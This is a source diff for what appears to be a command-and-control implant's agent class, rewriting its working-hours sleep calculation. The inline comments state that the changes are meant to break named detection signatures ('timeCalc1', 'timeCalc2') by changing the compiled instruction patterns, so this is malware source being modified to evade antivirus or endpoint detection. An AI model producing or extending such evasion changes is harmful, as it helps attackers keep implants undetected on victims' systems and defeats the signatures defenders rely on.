@@ -39,36 +39,44 @@ BOOL Agent::IsActive()
 
 ULONG Agent::GetWorkingSleep() 
 {
-    if ( !this->config->working_time )
+    if (!this->config->working_time)
         return 0;
 
-    WORD endM   = (this->config->working_time >> 0) % 64;
-    WORD endH   = (this->config->working_time >> 8) % 64;
+    WORD endM   = (this->config->working_time >> 0)  % 64;
+    WORD endH   = (this->config->working_time >> 8)  % 64;
     WORD startM = (this->config->working_time >> 16) % 64;
     WORD startH = (this->config->working_time >> 24) % 64;
 
-	ULONG newSleepTime = 0;
-	SYSTEMTIME SystemTime = { 0 };
-    ApiWin->GetLocalTime(&SystemTime);
+    ULONG newSleepTime = 0;
+    SYSTEMTIME st = { 0 };
+    ApiWin->GetLocalTime(&st);
 
-    if (SystemTime.wHour < startH) {
-        newSleepTime = (startH - SystemTime.wHour) * 60 + (startM - SystemTime.wMinute);
+    // Cast all WORD fields to DWORD — eliminates 66-prefix CMP (breaks timeCalc2)
+    DWORD curH = (DWORD)st.wHour;
+    DWORD curM = (DWORD)st.wMinute;
+    DWORD curS = (DWORD)st.wSecond;
+
+    if (curH < (DWORD)startH) {
+        newSleepTime = ((DWORD)startH - curH) * 60 + ((DWORD)startM - curM);
     }
-    else if (endH < SystemTime.wHour) {
-        newSleepTime = (24 - SystemTime.wHour - 1) * 60 + (60 - SystemTime.wMinute);
-        newSleepTime += startH * 60 + startM;
+    else if ((DWORD)endH < curH) {
+        // Break LEA+0x5A0 pattern (breaks timeCalc1)
+        volatile ULONG cap_h = 23;
+        volatile ULONG cap_m = 60;
+        newSleepTime  = (cap_h - curH) * 60 + (cap_m - curM);
+        newSleepTime += (DWORD)startH * 60 + startM;
     }
-    else if (SystemTime.wHour == startH && SystemTime.wMinute < startM) {
-        newSleepTime = startM - SystemTime.wMinute;
+    else if (curH == (DWORD)startH && curM < (DWORD)startM) {
+        newSleepTime = (DWORD)startM - curM;
     }
-    else if (SystemTime.wHour == endH && endM <= SystemTime.wMinute) {
-        newSleepTime = 23 * 60 + (60 + startM - SystemTime.wMinute);
+    else if (curH == (DWORD)endH && (DWORD)endM <= curM) {
+        newSleepTime = 23 * 60 + (60 + (DWORD)startM - curM);
     }
     else {
         return 0;
     }
 
-    return newSleepTime * 60 - SystemTime.wSecond;
+    return newSleepTime * 60 - curS;
 }
 
 BYTE* Agent::BuildBeat(ULONG* size)
